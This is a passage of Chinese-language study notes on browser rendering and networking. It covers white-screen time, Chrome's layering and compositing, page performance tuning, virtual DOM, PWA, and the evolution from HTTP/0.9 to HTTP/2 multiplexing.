请求开始，到首次显示页面的内容，在视觉上经历的三个阶段：</p><ul><li>第一个阶段，等请求发出去之后，到提交数据阶段，这时页面展示出来的还是之前页面的内容。</li><li>第二个阶段，提交数据之后渲染进程会创建一个空白页面，通常把这段时间称为<strong>解析白屏</strong>，并等待 CSS 文件和 JavaScript 文件的加载完成，生成 CSSOM 和 DOM，然后合成布局树，最后还要经过一系列的步骤准备首次渲染。</li><li>第三个阶段，等首次渲染完成之后，就开始进入完整页面的生成阶段了，然后页面会一点点被绘制出来。</li></ul><p>影响第一个阶段的因素主要是网络或者是服务器处理；第二个阶段的主要问题是白屏时间，如果白屏时间过久，就会影响到用户体验。</p><p>通常情况下的瓶颈主要体现在<strong>下载 CSS 文件、下载 JavaScript 文件和执行 JavaScript</strong>。所以要想缩短白屏时长，可以有以下策略：</p><ul><li>通过内联 JavaScript、内联 CSS 来移除这两种类型的文件下载，这样获取到 HTML 文件之后就可以直接开始渲染流程了。</li><li>但并不是所有的场合都适合内联，那么还可以尽量减少文件大小，比如通过 webpack 等工具移除一些不必要的注释，并压缩 JavaScript 文件。</li><li>还可以将一些不需要在解析 HTML 阶段使用的 JavaScript 标记上 sync 或者 defer。</li><li>对于大的 CSS 文件，可以通过媒体查询属性，将其拆分为多个不同用途的 CSS 文件，这样只有在特定的场景下才会加载特定的 CSS 文件。</li></ul><h2 id="分层和合成机制"><a href="#分层和合成机制" class="headerlink" title="分层和合成机制"></a>分层和合成机制</h2><h3 id="显示器是怎么显示图像的？"><a href="#显示器是怎么显示图像的？" class="headerlink" title="显示器是怎么显示图像的？"></a>显示器是怎么显示图像的？</h3><p>每个显示器都有固定的刷新频率，通常是 60HZ，也就是每秒更新 60 张图片，更新的图片都来自于显卡中一个叫<strong>前缓冲区</strong>的地方，显示器所做的任务很简单，就是每秒固定读取 60 次前缓冲区中的图像，并将读取的图像显示到显示器上。</p><p>显卡的职责就是合成新的图像，并将图像保存到<strong>后缓冲区</strong>中，一旦显卡把合成的图像写到后缓冲区，系统就会让后缓冲区和前缓冲区互换，这样就能保证显示器能读取到最新显卡合成的图像。通常情况下，显卡的更新频率和显示器的刷新频率是一致的。但有时候，在一些复杂的场景中，显卡处理一张图片的速度会变慢，这样就会造成视觉上的卡顿。</p><h3 id="帧-VS-帧率"><a href="#帧-VS-帧率" class="headerlink" title="帧 VS 帧率"></a>帧 VS 帧率</h3><p>当通过滚动条滚动页面，或者通过手势缩放页面时，屏幕上就会产生动画的效果。之所以能感觉到有动画的效果，是因为在滚动或者缩放操作时，渲染引擎会通过渲染流水线生成新的图片，并发送到显卡的后缓冲区。</p><p>大多数设备屏幕的更新频率是 60 次 / 秒，这也就意味着正常情况下要实现流畅的动画效果，渲染引擎需要每秒更新 60 张图片到显卡的后缓冲区。</p><p>我们把渲染流水线生成的每一副图片称为一帧，把渲染流水线每秒更新了多少帧称为帧率，比如滚动过程中 1 秒更新了 60 帧，那么帧率就是 60Hz（或者 60FPS）。</p><p>由于用户很容易观察到那些丢失的帧，如果在一次动画过程中，渲染引擎生成某些帧的时间过久，那么用户就会感受到卡顿，这会给用户造成非常不好的印象。</p><p>要解决卡顿问题，就要解决每帧生成时间过久的问题，为此 Chrome 对浏览器渲染方式做了大量的工作，其中最卓有成效的策略就是引入了分层和合成机制。</p><h3 id="如何生成一帧图像"><a href="#如何生成一帧图像" class="headerlink" title="如何生成一帧图像"></a>如何生成一帧图像</h3><p>关于其中任意一帧的生成方式，有<strong>重排、重绘</strong>和<strong>合成</strong>三种方式（具体见笔记（一）渲染流程）。Chrome 中的合成技术，可以用三个词来概括总结：<strong>分层、分块</strong>和<strong>合成</strong>。</p><h4 id="分层和合成"><a href="#分层和合成" class="headerlink" title="分层和合成"></a>分层和合成</h4><p>把一张网页想象成是由很多个图片叠加在一起的，每个图片就对应一个图层，Chrome 合成器最终将这些图层合成了用于显示页面的图片。在这个过程中，将素材分解为多个图层的操作就称为<strong>分层</strong>，最后将这些图层合并到一起的操作就称为<strong>合成</strong>。所以，分层和合成通常是一起使用的。</p><h4 id="Chrome-如何实现"><a href="#Chrome-如何实现" class="headerlink" title="Chrome 如何实现"></a><strong>Chrome 如何实现</strong></h4><p>在 Chrome 的渲染流水线中，<strong>分层体现在生成布局树之后</strong>，渲染引擎会根据布局树的特点将其转换为层树（Layer Tree），层树是渲染流水线后续流程的基础结构。</p><p>层树中的每个节点都对应着一个图层，下一步的绘制阶段就依赖于层树中的节点。但绘制阶段其实并不是真正地绘出图片，而是将绘制指令组合成一个列表，比如一个图层要设置的背景为黑色，并且还要在中间画一个圆形，那么绘制过程会生成<code>|Paint BackGroundColor:Black | Paint Circle|</code>这样的绘制指令列表，绘制过程就完成了。</p><p>有了绘制列表之后，就需要进入光栅化阶段了，光栅化就是按照绘制列表中的指令生成图片。每一个图层都对应一张图片，合成线程有了这些图片之后，会将这些图片合成为“一张”图片，并最终将生成的图片发送到后缓冲区。这就是一个大致的分层、合成流程。</p><p><strong>需要重点关注的是，合成操作是在合成线程上完成的，这也就意味着在执行合成操作时，是不会影响到主线程执行的</strong>。这就是为什么经常主线程卡住了，但是 CSS 动画依然能执行的原因。</p><h4 id="分块"><a href="#分块" class="headerlink" title="分块"></a>分块</h4><p>如果说分层是从<strong>宏观</strong>上提升了渲染效率，那么分块则是从<strong>微观</strong>层面提升了渲染效率。</p><p>通常情况下，页面的内容都要比屏幕大得多，显示一个页面时，如果等待所有的图层都生成完毕，再进行合成的话，会产生一些不必要的开销，也会让合成图片的时间变得更久。</p><p>因此，合成线程会将每个图层分割为大小固定的图块，然后优先绘制靠近视口的图块，这样就可以大大加速页面的显示速度。不过有时候， 即使只绘制那些优先级最高的图块，也要耗费不少的时间，因为涉及到一个很关键的因素——<strong>纹理上传</strong>，这是因为从计算机内存上传到 GPU 内存的操作会比较慢。</p><p>为了解决这个问题，Chrome 又采取了一个策略：<strong>在首次合成图块的时候使用一个低分辨率的图片</strong>。比如可以是正常分辨率的一半，分辨率减少一半，纹理就减少了四分之三。在首次显示页面内容的时候，将这个低分辨率的图片显示出来，然后合成器继续绘制正常比例的网页内容，当正常比例的网页内容绘制完成后，再替换掉当前显示的低分辨率内容。</p><h3 id="如何利用分层技术优化代码"><a href="#如何利用分层技术优化代码" class="headerlink" title="如何利用分层技术优化代码"></a>如何利用分层技术优化代码</h3><p>若经常需要对某个元素做几何形状变换、透明度变换或者一些缩放操作，如果使用 JavaScript 来写这些效果，会牵涉到整个渲染流水线，所以 JavaScript 的绘制效率会非常低下。</p><p>这时可以使用 will-change 来告诉渲染引擎你会对该元素做一些特效变换，CSS 代码如下：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">will-change: transform, opacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就是提前告诉渲染引擎 box 元素将要做几何变换和透明度变换操作，这时候渲染引擎会将该元素单独实现一帧，等这些变换发生时，渲染引擎会通过合成线程直接去处理变换，这些变换并没有涉及到主线程，这样就大大提升了渲染的效率。<strong>这也是 CSS 动画比 JavaScript 动画高效的原因</strong>。</p><p>但是凡事都有两面性，每当渲染引擎为一个元素准备一个独立层的时候，它占用的内存也会大大增加，因为从层树开始，后续每个阶段都会多一个层结构，这些都需要额外的内存。</p><h2 id="页面性能：如何系统地优化页面？"><a href="#页面性能：如何系统地优化页面？" class="headerlink" title="页面性能：如何系统地优化页面？"></a>页面性能：如何系统地优化页面？</h2><p><strong>即让页面更快地显示和响应。</strong>通常一个页面有三个阶段：<strong>加载阶段、交互阶段和关闭阶段</strong>。</p><ul><li>加载阶段，是指从发出请求到渲染出完整页面的过程，影响到这个阶段的主要因素有网络和 JavaScript 脚本。</li><li>交互阶段，主要是从页面加载完成到用户交互的整合过程，影响到这个阶段的主要因素是 JavaScript 脚本。</li><li>关闭阶段，主要是用户发出关闭指令后页面所做的一些清理操作。</li></ul><h3 id="加载阶段"><a href="#加载阶段" class="headerlink" title="加载阶段"></a>加载阶段</h3><p><img src="https://i.loli.net/2021/06/14/Ybg27vhl9uHck83.jpg" alt="Snipaste_2021-06-14_20-06-51.jpg"></p><p>我们把<strong>这些能阻塞网页首次渲染的资源称为关键资源</strong>。基于关键资源，我们可以继续细化出来三个影响页面首次渲染的核心因素。</p><ul><li><strong>第一个是关键资源个数</strong>。关键资源个数越多，首次页面的加载时间就会越长。比如上图中的关键资源个数就是 3 个，1 个 HTML 文件、1 个 JavaScript 和 1 个 CSS 文件。</li><li><strong>第二个是关键资源大小</strong>。通常情况下，所有关键资源的内容越小，其整个资源的下载时间也就越短，那么阻塞渲染的时间也就越短。上图中关键资源的大小分别是 6KB、8KB 和 9KB，那么整个关键资源大小就是 23KB。</li><li><strong>第三个是请求关键资源需要多少个 RTT（Round Trip Time）</strong>。<strong>RTT 即往返时延。它是网络中一个重要的性能指标，表示从发送端发送数据开始，到发送端收到来自接收端的确认，总共经历的时延</strong>。通常 1 个 HTTP 的数据包在 14KB 左右，所以 1 个 0.1M 的页面就需要拆分成 8 个包来传输了，也就是说需要 8 个 RTT。</li></ul><p><strong>总的优化原则就是减少关键资源个数，降低关键资源大小，降低关键资源的 RTT 次数</strong>。</p><ul><li>如何减少关键资源的个数？一种方式是可以将 JavaScript 和 CSS 改成内联的形式，比如上图的 JavaScript 和 CSS，若都改成内联模式，那么关键资源的个数就由 3 个减少到了 1 个。另一种方式，如果 JavaScript 代码没有 DOM 或者 CSSOM 的操作，则可以改成 sync 或者 defer 属性；同样对于 CSS，如果不是在构建页面之前加载的，则可以添加媒体取消阻止显现的标志。当 JavaScript 标签加上了 sync 或者 defer、CSSlink 属性之前加上了取消阻止显现的标志后，它们就变成了非关键资源了。</li><li>如何减少关键资源的大小？可以压缩 CSS 和 JavaScript 资源，移除 HTML、CSS、JavaScript 文件中一些注释内容，也可以通过前面讲的取消 CSS 或者 JavaScript 中关键资源的方式。</li><li>如何减少关键资源 RTT 的次数？可以通过减少关键资源的个数和减少关键资源的大小搭配来实现。除此之外，还可以使用 CDN 来减少每次 RTT 时长。</li></ul><h3 id="交互阶段"><a href="#交互阶段" class="headerlink" title="交互阶段"></a>交互阶段</h3><p><img src="https://i.loli.net/2021/06/14/IjmUtRW8cYQPMyJ.jpg" alt="Snipaste_2021-06-14_20-09-34.jpg"></p><p>优化方案：<strong>一个大的原则就是让单个帧的生成速度变快</strong>。</p><h4 id="1-减少-JavaScript-脚本执行时间"><a href="#1-减少-JavaScript-脚本执行时间" class="headerlink" title="1. 减少 JavaScript 脚本执行时间"></a>1. 减少 JavaScript 脚本执行时间</h4><p>有时 JavaScript 函数的一次执行时间可能有几百毫秒，这就严重霸占了主线程执行其他渲染任务的时间。</p><ul><li>一种是将一次执行的函数分解为多个任务，使得每次的执行时间不要过久。</li><li>另一种是采用 Web Workers。你可以把 Web Workers 当作主线程之外的一个线程，在 Web Workers 中是可以执行 JavaScript 脚本的，不过 Web Workers 中没有 DOM、CSSOM 环境，这意味着在 Web Workers 中是无法通过 JavaScript 来访问 DOM 的，所以我们可以把一些和 DOM 操作无关且耗时的任务放到 Web Workers 中去执行。</li></ul><h4 id="2-避免强制同步布局"><a href="#2-避免强制同步布局" class="headerlink" title="2. 避免强制同步布局"></a>2. 避免强制同步布局</h4><p>所谓强制同步布局，是指 JavaScript 强制将计算样式和布局操作提前到当前的任务中。</p><h4 id="3-避免布局抖动"><a href="#3-避免布局抖动" class="headerlink" title="3. 避免布局抖动"></a>3. 避免布局抖动</h4><p>还有一种比强制同步布局更坏的情况，那就是布局抖动。所谓布局抖动，是指在一次 JavaScript 执行过程中，多次执行强制布局和抖动操作。</p><p>这种情况的避免方式和强制同步布局一样，都是尽量不要在修改 DOM 结构时再去查询一些相关值。</p><h4 id="4-合理利用-CSS-合成动画"><a href="#4-合理利用-CSS-合成动画" class="headerlink" title="4. 合理利用 CSS 合成动画"></a>4. 合理利用 CSS 合成动画</h4><p>合成动画是直接在合成线程上执行的，这和在主线程上执行的布局、绘制等操作不同，如果主线程被 JavaScript 或者一些布局任务占用，CSS 动画依然能继续执行。所以要尽量利用好 CSS 合成动画，如果能让 CSS 处理动画，就尽量交给 CSS 来操作。</p><p>另外，如果能提前知道对某个元素执行动画操作，那就最好将其标记为 will-change，这是告诉渲染引擎需要将该元素单独生成一个图层。</p><h4 id="5-避免频繁的垃圾回收"><a href="#5-避免频繁的垃圾回收" class="headerlink" title="5. 避免频繁的垃圾回收"></a>5. 避免频繁的垃圾回收</h4><p>如果在一些函数中频繁创建临时对象，那么垃圾回收器也会频繁地去执行垃圾回收策略。这样当垃圾回收操作发生时，就会占用主线程，从而影响到其他任务的执行，严重的话还会让用户产生掉帧、不流畅的感觉。</p><p>所以可以尽可能优化储存结构，尽可能避免小颗粒对象的产生。</p><h2 id="虚拟DOM：虚拟DOM和实际的DOM有何不同？"><a href="#虚拟DOM：虚拟DOM和实际的DOM有何不同？" class="headerlink" title="虚拟DOM：虚拟DOM和实际的DOM有何不同？"></a>虚拟DOM：虚拟DOM和实际的DOM有何不同？</h2><h3 id="DOM-的缺陷"><a href="#DOM-的缺陷" class="headerlink" title="DOM 的缺陷"></a>DOM 的缺陷</h3><p>重排、重绘、合成。对于 DOM 的不当操作还有可能引发<strong>强制同步布局</strong>和<strong>布局抖动</strong>的问题，这些操作都会大大降低渲染效率。</p><h3 id="什么是虚拟-DOM"><a href="#什么是虚拟-DOM" class="headerlink" title="什么是虚拟 DOM"></a>什么是虚拟 DOM</h3><p>解决的事情:</p><ul><li>将页面改变的内容应用到虚拟 DOM 上，而不是直接应用到 DOM 上。</li><li>变化被应用到虚拟 DOM 上时，虚拟 DOM 并不急着去渲染页面，而仅仅是调整虚拟 DOM 的内部状态，这样操作虚拟 DOM 的代价就变得非常轻了。</li><li>在虚拟 DOM 收集到足够的改变时，再把这些变化一次性应用到真实的 DOM 上。</li></ul><p><img src="https://i.loli.net/2021/06/14/ZKzjmVgTqy6tLRp.jpg" alt="Snipaste_2021-06-14_20-16-56.jpg"></p><p>DOM 运行过程：</p><ul><li><strong>创建阶段</strong>。首先依据 JSX 和基础数据创建出来虚拟 DOM，它反映了真实的 DOM 树的结构。然后由虚拟 DOM 树创建出真实 DOM 树，真实的 DOM 树生成完后，再触发渲染流水线往屏幕输出页面。</li><li><strong>更新阶段</strong>。如果数据发生了改变，那么就需要根据新的数据创建一个新的虚拟 DOM 树；然后 React 比较两个树，找出变化的地方，并把变化的地方一次性更新到真实的 DOM 树上；最后渲染引擎更新渲染流水线，并生成新的页面。</li></ul><p><strong>从双缓存和 MVC 模型这两个视角来聊聊虚拟 DOM：</strong></p><h4 id="1-双缓存"><a href="#1-双缓存" class="headerlink" title="1. 双缓存"></a>1. 双缓存</h4><p>在开发游戏或者处理其他图像的过程中，屏幕从前缓冲区读取数据然后显示。但是很多图形操作都很复杂且需要大量的运算，比如一幅完整的画面，可能需要计算多次才能完成，如果每次计算完一部分图像，就将其写入缓冲区，那么就会造成一个后果，那就是在显示一个稍微复杂点的图像的过程中，你看到的页面效果可能是一部分一部分地显示出来，因此在刷新页面的过程中，会让用户感受到界面的闪烁。</p><p>而使用双缓存，可以让你先将计算的中间结果存放在另一个缓冲区中，等全部的计算结束，该缓冲区已经存储了完整的图形之后，再将该缓冲区的图形数据一次性复制到显示缓冲区，这样就使得整个图像的输出非常稳定。</p><p>在这里，你可以把虚拟 DOM 看成是 DOM 的一个 buffer，和图形显示一样，它会在完成一次完整的操作之后，再把结果应用到 DOM 上，这样就能减少一些不必要的更新，同时还能保证 DOM 的稳定输出。</p><h4 id="2-MVC-模式"><a href="#2-MVC-模式" class="headerlink" title="2. MVC 模式"></a>2. MVC 模式</h4><p>MVC 的整体结构比较简单，由模型、视图和控制器组成，其<strong>核心思想就是将数据和视图分离</strong>，也就是说视图和模型之间是不允许直接通信的，它们之间的通信都是通过控制器来完成的。通常情况下的通信路径是视图发生了改变，然后通知控制器，控制器再根据情况判断是否需要更新模型数据。</p><p>所以在分析基于 React 或者 Vue 这些前端框架时，我们需要先重点把握大的 MVC 骨架结构，然后再重点查看通信方式和控制器的具体实现方式，这样我们就能从架构的视角来理解这些前端框架了。比如在分析 React 项目时，我们可以把 React 的部分看成是一个 MVC 中的视图，在项目中结合 Redux 就可以构建一个 MVC 的模型结构，如下图所示：</p><p><img src="https://i.loli.net/2021/06/14/w2rmJGqKsAijtkD.jpg" alt="Snipaste_2021-06-14_20-19-40.jpg"></p><p>在该图中，我们可以把虚拟 DOM 看成是 MVC 的视图部分，其控制器和模型都是由 Redux 提供的。其具体实现过程如下：</p><ul><li>图中的控制器是用来监控 DOM 的变化，一旦 DOM 发生变化，控制器便会通知模型，让其更新数据；</li><li>模型数据更新好之后，控制器会通知视图，告诉它模型的数据发生了变化；</li><li>视图接收到更新消息之后，会根据模型所提供的数据来生成新的虚拟 DOM；</li><li>新的虚拟 DOM 生成好之后，就需要与之前的虚拟 DOM 进行比较，找出变化的节点；</li><li>比较出变化的节点之后，React 将变化的虚拟节点应用到 DOM 上，这样就会触发 DOM 节点的更新；</li><li>DOM 节点的变化又会触发后续一系列渲染流水线的变化，从而实现页面的更新。</li></ul><h2 id="渐进式网页应用（PWA）"><a href="#渐进式网页应用（PWA）" class="headerlink" title="渐进式网页应用（PWA）"></a>渐进式网页应用（PWA）</h2><p>PWA，全称是 Progressive Web App，即“渐进式 +Web 应用”。至于“渐进式”，从下面两个方面来理解：</p><ul><li>站在 Web 应用开发者来说，PWA 提供了一个渐进式的过渡方案，让普通站点逐步过渡到 Web 应用。采取渐进式可以降低站点改造的代价，使得站点逐步支持各项新技术，而不是一步到位。</li><li>站在技术角度来说，PWA 技术也是一个渐进式的演化过程，在技术层面会一点点演进，比如逐渐提供更好的设备特性支持，不断优化更加流畅的动画效果，不断让页面的加载速度变得更快，不断实现本地应用的特性。</li></ul><h1 id="浏览器中的网络"><a href="#浏览器中的网络" class="headerlink" title="浏览器中的网络"></a>浏览器中的网络</h1><h2 id="HTTP-1：HTTP性能优化"><a href="#HTTP-1：HTTP性能优化" class="headerlink" title="HTTP/1：HTTP性能优化"></a>HTTP/1：HTTP性能优化</h2><h3 id="超文本传输协议-HTTP-0-9"><a href="#超文本传输协议-HTTP-0-9" class="headerlink" title="超文本传输协议 HTTP/0.9"></a>超文本传输协议 HTTP/0.9</h3><p>HTTP/0.9 是于 1991 年提出的，主要用于学术交流，需求很简单——用来在网络之间传递 HTML 超文本的内容，所以被称为<strong>超文本传输协议</strong>。</p><p>HTTP/0.9 的一个完整的请求流程（可参考下图）。</p><ul><li>因为 HTTP 都是基于 TCP 协议的，所以客户端先要根据 IP 地址、端口和服务器建立 TCP 连接，而建立连接的过程就是 TCP 协议三次握手的过程。</li><li>建立好连接之后，会发送一个 GET 请求行的信息，如<code>GET /index.html</code>用来获取 index.html。</li><li>服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 ASCII 字符流返回给客户端。</li><li>HTML 文档传输完成后，断开连接。</li></ul><p><img src="https://i.loli.net/2021/06/14/D3WYz4wmiP9kc6C.jpg" alt="Snipaste_2021-06-14_20-35-44.jpg"></p><p>HTTP/0.9 的实现有以下三个特点：</p><ul><li>第一个是只有一个请求行，并没有<strong>HTTP 请求头和请求体</strong>，因为只需要一个请求行就可以完整表达客户端的需求了。</li><li>第二个是服务器也没有返回头信息，这是因为服务器端并不需要告诉客户端太多信息，只需要返回数据就可以了。</li><li>第三个是返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输是最合适的。</li></ul><h3 id="被浏览器推动的-HTTP-1-0"><a href="#被浏览器推动的-HTTP-1-0" class="headerlink" title="被浏览器推动的 HTTP/1.0"></a>被浏览器推动的 HTTP/1.0</h3><p>在浏览器中展示的不单是 HTML 文件了，还包括了 JavaScript、CSS、图片、音频、视频等不同类型的文件。因此<strong>支持多种类型的文件下载是 HTTP/1.0 的一个核心诉求</strong>，而且文件格式不仅仅局限于 ASCII 编码，还有很多其他类型编码的文件。</p><p>为了让客户端和服务器能更深入地交流，HTTP/1.0 引入了请求头和响应头，它们都是以为 Key-Value 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。至于 HTTP/1.0 具体的请求流程，你可以参考下图。</p><p><img src="https://i.loli.net/2021/06/14/21fcJbhFNno7Dqv.jpg" alt="Snipaste_2021-06-14_20-37-24.jpg"></p><p>HTTP/1.0 通过请求头和响应头来进行协商，在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accept: text/html</span><br><span class="line">accept-encoding: gzip, deflate, br</span><br><span class="line">accept-Charset: ISO-8859-1,utf-8</span><br><span class="line">accept-language: zh-CN,zh</span><br></pre></td></tr></table></figure><p>第一行表示期望服务器返回 html 类型的文件，第二行表示期望服务器可以采用 gzip、deflate 或者 br 其中的一种压缩方式，第三行表示期望返回的文件编码是 UTF-8 或者 ISO-8859-1，第四行是表示期望页面的优先语言是中文。</p><p>服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。不过有时候会有一些意外情况发生，比如浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据响应头的信息来处理数据。下面是一段响应头的数据信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content-encoding: br</span><br><span class="line">content-type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>第一行表示服务器采用了 br 的压缩方法，第二行表示服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8。</p><p>HTTP/1.0 除了对多文件提供良好的支持外，还依据当时实际的需求引入了很多其他的特性，这些特性都是通过请求头和响应头来实现的。下面我们来看看新增的几个典型的特性：</p><ul><li>有的请求服务器可能无法处理，或者处理出错，这时候就需要告诉浏览器服务器最终处理该请求的情况，这就引入了<strong>状态码</strong>。状态码是通过响应行的方式来通知浏览器的。</li><li>为了减轻服务器的压力，在 HTTP/1.0 中提供了<strong>Cache 机制</strong>，用来缓存已经下载过的数据。</li><li>服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP/1.0 的请求头中还加入了<strong>用户代理</strong>的字段。</li></ul><h3 id="缝缝补补的-HTTP-1-1"><a href="#缝缝补补的-HTTP-1-1" class="headerlink" title="缝缝补补的 HTTP/1.1"></a>缝缝补补的 HTTP/1.1</h3><h4 id="1-改进持久连接"><a href="#1-改进持久连接" class="headerlink" title="1. 改进持久连接"></a>1. 改进持久连接</h4><p>HTTP/1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段。为了解决这个问题，<strong>HTTP/1.1 中增加了持久连接的方法，它的特点是在一个 TCP 连接上可以传输多个 HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持</strong>。</p><p>HTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。持久连接在 HTTP/1.1 中是默认开启的，如果不想要采用持久连接，可以在 HTTP 请求头中加上<code>Connection: close</code>。目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。</p><h4 id="2-不成熟的-HTTP-管线化"><a href="#2-不成熟的-HTTP-管线化" class="headerlink" title="2. 不成熟的 HTTP 管线化"></a>2. 不成熟的 HTTP 管线化</h4><p>持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是著名的<strong>队头阻塞</strong>的问题。</p><p>HTTP/1.1 中试图通过管线化的技术来解决<strong>队头阻塞</strong>的问题。HTTP/1.1 中的管线化是指将多个 HTTP 请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。</p><h4 id="3-提供虚拟主机的支持"><a href="#3-提供虚拟主机的支持" class="headerlink" title="3. 提供虚拟主机的支持"></a>3. 提供虚拟主机的支持</h4><p>在 HTTP/1.0 中，每个域名绑定了一个唯一的 IP 地址，因此一个服务器只能支持一个域名。但是随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。</p><p>因此，HTTP/1.1 的请求头中增加了<strong>Host 字段</strong>，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。</p><h4 id="4-对动态生成的内容提供了完美支持"><a href="#4-对动态生成的内容提供了完美支持" class="headerlink" title="4. 对动态生成的内容提供了完美支持"></a>4. 对动态生成的内容提供了完美支持</h4><p>在设计 HTTP/1.0 时，需要在响应头中设置完整的数据大小，如<code>Content-Length: 901</code>，这样浏览器就可以根据设置的数据大小来接收数据。不过随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。</p><p>HTTP/1.1 通过引入<strong>Chunk transfer 机制</strong>来解决这个问题，服务器会将数据分割成若干个任意大小的数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。</p><h4 id="5-客户端-Cookie、安全机制"><a href="#5-客户端-Cookie、安全机制" class="headerlink" title="5. 客户端 Cookie、安全机制"></a>5. 客户端 Cookie、安全机制</h4><h2 id="HTTP-2：如何提升网络速度？"><a href="#HTTP-2：如何提升网络速度？" class="headerlink" title="HTTP/2：如何提升网络速度？"></a>HTTP/2：如何提升网络速度？</h2><h3 id="HTTP-1-1-的主要问题"><a href="#HTTP-1-1-的主要问题" class="headerlink" title="HTTP/1.1 的主要问题"></a>HTTP/1.1 的主要问题</h3><p> HTTP/1.1<strong>对带宽的利用率却并不理想</strong>，这也是 HTTP/1.1 的一个核心问题。<strong>带宽是指每秒最大能发送或者接收的字节数</strong>。我们把每秒能发送的最大字节数称为<strong>上行带宽</strong>，每秒能够接收的最大字节数称为<strong>下行带宽</strong>。</p><p>HTTP/1.1 很难将带宽用满。比如我们常说的 100M 带宽，实际的下载速度能达到 12.5M/S，而采用 HTTP/1.1 时，也许在加载页面资源时最大只能使用到 2.5M/S，很难将 12.5M 全部用满。</p><p>之所以会出现这个问题，主要是由以下三个原因导致的。</p><p><strong>第一个原因，TCP 的慢启动。</strong>之所以说慢启动会带来性能问题，是因为页面中常用的一些关键资源文件本来就不大，如 HTML 文件、CSS 文件和 JavaScript 文件，通常这些文件在 TCP 连接建立好之后就要发起请求的，但这个过程是慢启动，所以耗费的时间比正常的时间要多很多，这样就推迟了宝贵的首次渲染页面的时长了。</p><p><strong>第二个原因，同时开启了多条 TCP 连接，那么这些连接会竞争固定的带宽。</strong>系统同时建立了多条 TCP 连接，当带宽充足时，每条连接发送或者接收速度会慢慢向上增加；而一旦带宽不足时，这些 TCP 连接又会减慢发送或者接收的速度。比如一个页面有 200 个文件，使用了 3 个 CDN，那么加载该网页的时候就需要建立 6 * 3，也就是 18 个 TCP 连接来下载资源；在下载过程中，当发现带宽不足的时候，各个 TCP 连接就需要动态减慢接收数据的速度。</p><p>有的 TCP 连接下载的是一些关键资源，如 CSS 文件、JavaScript 文件等，而有的 TCP 连接下载的是图片、视频等普通的资源文件，但是多条 TCP 连接之间又不能协商让哪些关键资源优先下载，这样就有可能影响那些关键资源的下载速度了。</p><p><strong>第三个原因，HTTP/1.1 队头阻塞的问题。</strong>在 HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。</p><p>在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。</p><h3 id="HTTP-2-的多路复用"><a href="#HTTP-2-的多路复用" class="headerlink" title="HTTP/2 的多路复用"></a>HTTP/2 的多路复用</h3><p>HTTP/2 的思路就是<strong>一个域名只使用一个 TCP 长连接 <strong>来传输数据，这样整个页面资源的下载过程只需要一次慢启动，同时也避免了多个 TCP 连接竞争带宽所带来的问题；</strong>消除队头阻塞问题</strong>。</p><p><img src="https://i.loli.net/2021/06/15/KUeDB5NsnkvWSz3.jpg" alt="Snipaste_2021-06-15_14-49-41.jpg"></p><p>该图就是 HTTP/2 最核心、最重要且最具颠覆性的<strong>多路复用机制</strong>。从图中你会发现每个请求都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。</p><p>服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容，比如服务器可能早就缓存好了 index.html 和 bar.js 的响应头信息，那么当接收到请求的时候就可以立即把 index.html 和 bar.js 的响应头信息返回给浏览器，然后再将 index.html 和 bar.js 的响应体数据返回给浏览器。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其拼接为完整的 HTTP 响应数据。</p><p>HTTP/2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求。</p><h3 id="多路复用的实现"><a href="#多路复用的实现" class="headerlink" 